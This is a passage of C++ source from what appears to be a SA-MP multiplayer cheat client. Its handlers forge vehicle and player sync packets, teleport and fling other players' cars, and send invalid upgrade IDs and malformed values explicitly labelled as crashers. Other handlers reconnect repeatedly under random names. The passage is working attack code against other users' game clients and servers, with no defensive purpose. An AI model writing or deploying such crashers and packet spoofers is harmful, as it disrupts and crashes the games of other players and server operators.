			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			

			static float fRotation = 0.0f;

			onSync.fQuaternion[0] = cosf(fRotation);
			onSync.fQuaternion[3] = sinf(fRotation);

			static DWORD timer = 0;
			if ( GetTickCount() - timer > 1 )
			{
				fRotation += 4.0f;
				if ( fRotation >= 360.0f ) fRotation = 0.0f;

				timer = GetTickCount();
			}

			static DWORD timer2 = 0;
			if ( GetTickCount() - timer2 > 1 )
			{
				onSync.sUpDownKeys = 128;
				timer2 = GetTickCount();
			}
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);

  }}


 void cheat_handle_pickmaasssssswqzzq()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas2 == 1 )  
  { 
	  stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			static float fRotation = 0.0f;

			onSync.fQuaternion[0] = cosf(fRotation);
			onSync.fQuaternion[3] = sinf(fRotation);

			onSync.byteCurrentWeapon = 46;

			static DWORD timer = 0;
			if ( GetTickCount() - timer > 95 )
			{
				fRotation += 1.0f;
				if ( fRotation >= 360.0f ) fRotation = 0.0f;

				timer = GetTickCount();
			}

			static DWORD timer2 = 0;
			if ( GetTickCount() - timer2 > 250 )
			{
				onSync.sUpDownKeys = 128;
				onSync.iCurrentAnimationID = 0x3C5;

				timer2 = GetTickCount();
			}
			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
}}


 void cheat_handle_pickmaasssssswqzz()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas1 == 1 )  
  {  

			stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		

			onSync.fQuaternion[0] = random_float(-1, 1);
				onSync.fQuaternion[1] = random_float(-1, 1);
				onSync.fQuaternion[2] = random_float(-1, 1);
				onSync.fQuaternion[3] = random_float(-1, 1);
			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
		
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);

}}

 static bool disco_state = false;
 void cheat_handle_pickmaasssssswq()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas == 1 )  
  {  
	  for(int ccflood = 0; ccflood < 5;ccflood++)
	{
	 if ( !disco_state )
		{
			disco_state = true;
		} 	

		static bool pfoot_State = false;
		if (pfoot_State == false)
		{
			stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			onSync.byteCurrentWeapon = 0;			
			onSync.sUpDownKeys = 128;
			onSync.sLeftRightKeys = 128;	
			onSync.sKeys = 4;
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			pfoot_State = true;
		}
		else
		{
			stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			onSync.byteCurrentWeapon = 44 + rand() % 2;			
			onSync.sUpDownKeys = 128;
			onSync.sLeftRightKeys = 128;	
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
		
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			pfoot_State = false;
		}
	  }}
	else
	{
		if ( disco_state )
		{
			disco_state = false;
	}
  }}


 void cheat_handle_pickmaaaa()  
{  
  traceLastFunc( "cheat_handle_pickmaaaa()" );  
  if( cheat_state->_generic.pickmaaaa == 1 )  
  {  
	 static int time = 0;
if (GetTickCount() - 1500 > time)
{
		char nick[15] = {0};
		gen_random(nick, 15);
		setLocalPlayerName(nick); //ставим локальное имя(видим только мы)   
		disconnect( 500 );//дисконнкет от сервера(выход)   
		restartGame();//рестарт игры   
		g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)
		time = GetTickCount();
}
	}}

 void cheat_handle_pickmaaaas()  
{  
  traceLastFunc( "cheat_handle_pickmaaaas()" );  
  if( cheat_state->_generic.pickmaaaas == 1 )  
  {  
		struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 20.0f);
		fPos[1] += (cosf(-self->fCurrentRotation) * 20.0f);
		fPos[2] += 2.0f;
		
		float fSpeed[3];

		float fQuaternion[4] = { +9.0f, +9.0f, +6.75f };

		
		fPos[0] += (float)(rand() % 10);
		fPos[1] += (float)(rand() % 10);
		fPos[2] += (float)(rand() % 10);

		

		fSpeed[0] += (float)(rand() % 3);
		fSpeed[1] += (float)(rand() % 3);
		fSpeed[2] += (float)(rand() % 3);

		
		
		
		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;

		SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;	
	} 
  }

void cheat_handle_deathb()  
{  
traceLastFunc( "cheat_handle_deathb()" );  
if( cheat_state->_generic.deathb == 1 ) 
{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 5.0f) + (-20 + rand()%40);
		fPos[1] += (cosf(-self->fCurrentRotation) * 5.0f) + (-20 + rand()%40);
		fPos[2] += 10.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;

		SendFakeDriverFullSyncData(&vehSync, 0);
		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );
		vect3_zero( vinfo->speed );

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;
}
} 

void cheat_handle_vehcomponent_crasher ()
{
	traceLastFunc( "cheat_handle_vehcomponent_crasher()" );

	if(cheat_state->_generic.vehcomponentcrasher == 1)
	{
		static int time = 0;
		if (GetTickCount() - 200 > time)
		{

	GTAfunc_PerformAnimation("ped", "HIT_walk", 22, 22, 22, 22, 22, 22, 22, 22);
	//GTAfunc_PerformAnimation("ped", "HIT_walk", -1, 0, 1, 0, 0, 0, 0, 0);
	time = GetTickCount();
		}
	}}


void cheat_handle_vehcomponent_crasher32()
{
	traceLastFunc("cheat_handle_vehcomponent_crasher()");
if (cheat_state->_generic.passenger_crasher_enable == 1) 
{
	if (cheat_state->state == CHEAT_STATE_ACTOR)
	{
		struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
		if (self == NULL)
			return;

		ScriptCommand(&anim_speed, ScriptActorId(self), "PYTHON_CROUCHFIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "PYTHON_FIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "PYTHON_FIRE_POOR", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "PYTHON_CROCUCHRELOAD", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "RIFLE_CROUCHFIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "RIFLE_CROUCHLOAD", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "RIFLE_FIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "RIFLE_FIRE_POOR", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "RIFLE_LOAD", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SHOTGUN_CROUCHFIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SHOTGUN_FIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SHOTGUN_FIRE_POOR", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SILENCED_CROUCH_RELOAD", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SILENCED_CROUCH_FIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SILENCED_FIRE", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "SILENCED_RELOAD", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "TEC_crouchfire", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "TEC_crouchreload", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "TEC_fire", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "TEC_reload", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "UZI_crouchfire", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "UZI_crouchreload", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "UZI_fire", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "UZI_fire_poor", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "UZI_reload", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "idle_rocket", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "Rocket_Fire", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "run_rocket", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "walk_rocket", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "WALK_start_rocket", set.rapid_speed);
		ScriptCommand(&anim_speed, ScriptActorId(self), "WEAPON_sniper", set.rapid_speed);
	}
}
}

void cheat_handle_vehcomponent_crasher1 ()
{
	traceLastFunc( "cheat_handle_vehcomponent_crasher1()" );

	if(cheat_state->_generic.vehcomponentcrasher1 == 1)
	{
		static int time = 0;
		if (GetTickCount() - 200 > time)
		{

	GTAfunc_PerformAnimation("BSKTBALL", "BBALL_Net_Dnk_O", 22, 22, 22, 22, 22, 22, 22, 22);
	time = GetTickCount();
		}
	}}

void cheat_handle_vehcomponent_crasher2 ()
{
	traceLastFunc( "cheat_handle_vehcomponent_crasher2()" );

	if(cheat_state->_generic.vehcomponentcrasher2 == 1)
	{
		static int time = 0;
		if (GetTickCount() - 200 > time)
		{

	GTAfunc_PerformAnimation("GHANDS", "LHGsign1", 22, 22, 22, 22, 22, 22, 22, 22);
	time = GetTickCount();
		}
	}}

void cheat_handle_pickm1()  
{  
  traceLastFunc( "cheat_handle_pickm1()" );  
  if( cheat_state->_generic.pickm1 == 1 )  
  {   
  static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &vinfo->base.matrix[4 * 3], fPos );

		SendFakeDriverSyncData(iSAMPVehicleID, fPos, 0.0f, vinfo->speed, 0);
		vinfo->hitpoints = 0.0f;

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
		{
			v = 0;
			cheat_state->_generic.pickm1 = 0;
		}
	}
  }


void cheat_handle_pickm13()  
{  
  traceLastFunc( "cheat_handle_pickm13()" );  
  if( cheat_state->_generic.pickm13 == 1 )  
  {   
	struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );
	struct vehicle_info *pSelfVehicle = vehicle_info_get( VEHICLE_SELF, NULL );

	float *coord = ( cheat_state->state == CHEAT_STATE_VEHICLE ) ? cheat_state->vehicle.coords : cheat_state->actor.coords;

	static bool bBikeCrasherState = 0;
	static bool bTrainSpeedState = 0;
	static DWORD dwBikeCrasherTimerTick = GetTickCount();

	uint16_t sCurrentVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;

	BYTE byteCurrentWeapon;

	if ( cheat_state->state == CHEAT_STATE_VEHICLE )
		byteCurrentWeapon = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

	else if ( cheat_state->state == CHEAT_STATE_ACTOR )
		byteCurrentWeapon = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

	else byteCurrentWeapon = 0;

	if(dwBikeCrasherTimerTick < GetTickCount() - 50)
	{
		if(!bBikeCrasherState)
		{
			INCAR_SYNC_DATA vehSync;
			 BitStream bsVehicleSync;

			memset(&vehSync, 0, sizeof(stInCarData));

			vehSync.VehicleID = sCurrentVehicleID;

			vehSync.bytePlayerHealth = pSelfActor->hitpoints;
			

			vehSync.byteCurrentWeapon = byteCurrentWeapon;

			vehSync.vecPos[0] = coord[0];
			vehSync.vecPos[1] = coord[1];
			vehSync.vecPos[2] = coord[2];

			vehSync.fCarHealth = pSelfVehicle->hitpoints;

			if(!bTrainSpeedState)
				vehSync.fTrainSpeed = (float)0xFFFFFFFFFFFFFFFF;

			bTrainSpeedState ^= 1;
			
			SendFakeDriverFullSyncData(&vehSync, 0);
			}
		else
		{
			float fPos[3], fSpeed[3];

			fPos[0] = coord[0];
			fPos[1] = coord[1];
			fPos[2] = coord[2] + 1.5f;

			SendFakeOnfootSyncData1(fPos, pSelfActor->hitpoints, 0,  fSpeed);
		}

		bBikeCrasherState ^= 1;
		dwBikeCrasherTimerTick = GetTickCount();
	}
  }}

float getDistanceFromLocalPlayer(float fX, float fY, float fZ)
{
	struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );

	if(pSelfActor == NULL)
		return 999999999.9f;
	
	float fSX = (fX - pSelfActor->base.coords[0]) * (fX - pSelfActor->base.coords[0]);
	float fSY = (fY - pSelfActor->base.coords[1]) * (fY - pSelfActor->base.coords[1]);
	float fSZ = (fZ - pSelfActor->base.coords[2]) * (fZ - pSelfActor->base.coords[2]);
	
	return (float)sqrt(fSX + fSY + fSZ);
}

int sampFindNearestDriver()
{
	unsigned int iClosestPlayerID = 0xFFFF;
	float fClosestPlayerDistance = 999999999.9f;
	float fTargetPos[3];
	float fDistances[SAMP_PLAYER_MAX];

	for ( int p = 0; p < SAMP_PLAYER_MAX; p++ )
	{
		fDistances[p] = 999999999.9f;

		if(getPlayerPos(p, fTargetPos) && getPlayerState(p) == PLAYER_STATE_DRIVER)
			fDistances[p] = getDistanceFromLocalPlayer(fTargetPos[0], fTargetPos[1], fTargetPos[2]);
	}

	for ( int p = 0; p < SAMP_PLAYER_MAX; p++ )
	{
		if(fClosestPlayerDistance > fDistances[p] && fDistances[p] != 999999999.9f)
		{
			iClosestPlayerID = p;
			fClosestPlayerDistance = fDistances[p];
		}
	}

	if(iClosestPlayerID != 0xFFFF && fClosestPlayerDistance != 999999999.9f)
		return iClosestPlayerID;
	else
		return 0xFFFF;
}

void cheat_handle_vehcomponent_crasher21 ()
{
	static int once = 1;
	static int carUsed[SAMP_VEHICLE_MAX];
	traceLastFunc( "cheat_handle_vehcomponent_crasher21()" );
	if(cheat_state->_generic.vehcomponentcrasher21 == 1)
	{
	if ( once == 1 )
			once = 0;

		struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		int		nearestCar = 0;
		static int previousCar;

		for ( int v = 0; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] != 1 )
				continue;

			int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
			struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

			int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
			if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
				continue;

			if ( carUsed[v] == 1 )
				continue;

			nearestCar = v;
		}

		if ( nearestCar <= 0 || nearestCar >= SAMP_VEHICLE_MAX )
		{
			for ( int i = 0; i < SAMP_VEHICLE_MAX; i++ )
				carUsed[i] = 0;

			return;
		}

		if ( nearestCar == previousCar )
		{
			for ( int i = 0; i < SAMP_VEHICLE_MAX; i++ )
				carUsed[i] = 0;

			

			return;
		}

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[nearestCar]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);

		vect3_copy( &vinfo->base.matrix[4 * 3], fPos );

		// Vehicle Crash Components
		int crashComponents[VEHICLE_UPGRADES_COUNT] =
		{
			1087, 1009, 1008, 1010, 1086, 1111, 1112, 1000, 1001, 1002, 1003, 1014, 1015, 1016, 1023, 1049, 1050, 1058, 1060, 1138, 1139, 1147, 1146,
			1162, 1158, 1164, 1163, 1004, 1005, 1011, 1012, 1142, 1143, 1144, 1145, 1006, 1032, 1033, 1038, 1035, 1054, 1053, 1055, 1061, 1067, 1068,
			1088, 1091, 1103, 1128, 1130, 1131, 1169, 1170, 1141, 1140, 1171, 1172, 1149, 1148, 1153, 1152, 1150, 1151, 1155, 1157, 1154, 1156, 1160,
			1173, 1159, 1161, 1166, 1165, 1168, 1167, 1174, 1175, 1176, 1177, 1179, 1185, 1180, 1178, 1182, 1181, 1184, 1183, 1189, 1188, 1187, 1186,
			1191, 1190, 1192, 1193, 1017, 1007, 1027, 1026, 1030, 1031, 1040, 1036, 1039, 1041, 1042, 1099, 1051, 1047, 1052, 1048, 1062, 1056, 1063,
			1057, 1071, 1069, 1072, 1070, 1094, 1090, 1093, 1095, 1101, 1122, 1124, 1106, 1102, 1133, 1107, 1108, 1120, 1118, 1121, 1119, 1137, 1134,
			1018, 1019, 1020, 1021, 1022, 1028, 1029, 1034, 1037, 1043, 1044, 1045, 1046, 1059, 1064, 1065, 1066, 1089, 1092, 1104, 1105, 1113, 1114,
			1126, 1127, 1129, 1132, 1135, 1136, 1100, 1109, 1110, 1115, 1116, 1117, 1123, 1125, 1013, 1024, 1025, 1073, 1074, 1075, 1076, 1077, 1078,
			1079, 1080, 1081, 1082, 1083, 1084, 1085, 1096, 1097, 1098
		};

		static int c = 0;

		SendFakeDriverSyncData(iSAMPVehicleID, fPos, vinfo->hitpoints, vinfo->speed, 0);

		
			sendSCMEvent(2, iSAMPVehicleID, crashComponents[c], crashComponents[c]);
		

		c++;

		if ( c >= VEHICLE_UPGRADES_COUNT )
			c = 0;

		carUsed[iSAMPVehicleID] = 1;

		previousCar = iSAMPVehicleID;
	}
	else
	{
		if ( once == 0 )
		{
			for ( int v = 0; v < SAMP_VEHICLE_MAX; v++ )
				carUsed[v] = 0;

			once = 0;
		}
	
  }}


	

  
  void cheat_handle_crh1 () 
{ 
	traceLastFunc( "cheat_handle_crh1()" );
      if( cheat_state->_generic.crh1 == 1 ) 
     {
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };
		float fQuaternion[3] = { 0.0f, 90.0f, 0.0f };

		static int state = 0;

		if ( state == 0 )
		{
			fPos[2] += 4.0f;
			fPos[1] += 7.5f;
			fSpeed[1] = 3.0f;
			fQuaternion[0] = 100.0f;
		}
		else if ( state == 1 )
		{
			fPos[2] += 6.0f;
			fSpeed[2] = 3.0f;
			fQuaternion[2] = 180.0f;
		}
		else if ( state == 2 )
		{
			fPos[2] += 4.0f;
			fPos[1] += -7.5f;
			fSpeed[1] = -3.0f;
			fQuaternion[0] = -100.0f;
		}

		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.fQuaternion[0] = cosf(fQuaternion[0]);
		vehSync.fQuaternion[1] = sinf(fQuaternion[2]);
		vehSync.fQuaternion[2] = sinf(fQuaternion[1]);
		vehSync.fQuaternion[3] = sinf(fQuaternion[0]);
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
	

		SendFakeDriverFullSyncData(&vehSync, 0);
		

		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );
		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		if ( state == 0 )
		{
			vinfo->base.matrix[0] = sinf(fQuaternion[0]);
			vinfo->base.matrix[1] = sinf(fQuaternion[0]);

			state = 1;
		}
		else if ( state == 1 )
		{
			state = 2;
		}
		else if ( state == 2 )
		{
			vinfo->base.matrix[2] = cosf(fQuaternion[0]);
			vinfo->base.matrix[3] = cosf(fQuaternion[0]);

			state = 0;
		}

		vinfo->base.matrix[4] = fQuaternion[0];
		vinfo->base.matrix[5] = fQuaternion[1];
		vinfo->base.matrix[6] = fQuaternion[2];

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;
	} 
  } 

 
    
  
  void cheat_handle_crh2 () 
{ 
	traceLastFunc( "cheat_handle_crh2()" );
      if( cheat_state->_generic.crh2 == 1 )
     {
		for (int i = 0; i < SAMP_PLAYER_MAX; i++ )
  {
    if ( g_Players->iIsListed[i] != 1 )
    continue;
    if(g_Players->pRemotePlayer[i] == NULL)
    continue;
    say("============ %s ============", getPlayerName(i));
}
        }
	  }


  void cheat_handle_crh25a () 
{ 
	traceLastFunc( "cheat_handle_crh25a()" );
    if( cheat_state->_generic.log_packet_recv == 1 )
    {
		//float coord[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
		//float speed[3];
		//speed[0] = (float)0;
		//speed[1] = (float)0;
		//speed[2] = (float)0;
		//float fQuaternion[4];
		//fQuaternion[0] = (float)9.99;
		//fQuaternion[1] = (float)9.99;
		//fQuaternion[2] = (float)9.99;
		//fQuaternion[3] = (float)9.99;
